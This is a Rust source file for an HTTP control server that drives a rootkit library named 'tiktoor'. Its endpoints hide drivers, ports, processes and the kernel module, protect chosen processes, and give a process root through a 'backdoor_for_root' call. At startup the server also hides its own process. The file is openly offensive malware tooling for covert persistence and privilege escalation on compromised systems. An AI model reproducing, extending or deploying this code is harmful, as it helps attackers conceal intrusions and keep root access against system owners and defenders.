use actix_web::{post, web, App, HttpResponse, HttpServer, Responder};
use serde::Deserialize;
use std::ffi::CString;
use std::process;
use structopt::StructOpt;

/// A CLI tool for communicating with tiktoor
#[derive(StructOpt)]
struct Cli {
    /// Bind host
    #[structopt(long, short)]
    host: String,
    /// Bind port
    #[structopt(long, short)]
    port: u16,
}

#[derive(Deserialize)]
struct HideDriverParameter {
    name: CString,
}

#[post("/hide_driver")]
async fn hide_driver(parameter: web::Json<HideDriverParameter>) -> impl Responder {
    tiktoor_client::hide_driver(&parameter.name);
    HttpResponse::Ok()
}

#[derive(Deserialize)]
struct HidePortParameter {
    transmission_type: u8,
    port: u16,
}

#[post("/hide_port")]
async fn hide_port(parameter: web::Json<HidePortParameter>) -> impl Responder {
    tiktoor_client::hide_port(parameter.transmission_type, parameter.port);
    HttpResponse::Ok()
}

#[derive(Deserialize)]
struct HideProcessParameter {
    pid: u32,
}

#[post("/hide_process")]
async fn hide_process(parameter: web::Json<HideProcessParameter>) -> impl Responder {
    tiktoor_client::hide_process(parameter.pid);
    HttpResponse::Ok()
}

#[post("/protect_process")]
async fn protect_process(parameter: web::Json<HideProcessParameter>) -> impl Responder {
    tiktoor_client::protect_process(parameter.pid);
    HttpResponse::Ok()
}

#[post("/hide_module")]
async fn hide_module() -> impl Responder {
    tiktoor_client::hide_module();
    HttpResponse::Ok()
}

#[post("/unhide_module")]
async fn unhide_module() -> impl Responder {
    tiktoor_client::unhide_module();
    HttpResponse::Ok()
}

#[derive(Deserialize)]
struct BackdoorForRootParameter {
    pid: u32,
}

#[post("/backdoor_for_root")]
async fn backdoor_for_root(parameter: web::Json<BackdoorForRootParameter>) -> impl Responder {
    tiktoor_client::backdoor_for_root(parameter.pid);
    HttpResponse::Ok()
}

#[actix_web::main]
async fn main() -> std::io::Result<()> {
    let cli = Cli::from_args();

    // hide myself
    tiktoor_client::hide_process(process::id());

    HttpServer::new(|| {
        App::new()
            .service(hide_process)
            .service(hide_module)
            .service(unhide_module)
            .service(hide_driver)
            .service(hide_port)
            .service(protect_process)
            .service(backdoor_for_root)
    })
    .bind((cli.host, cli.port))?
    .run()
    .await
}
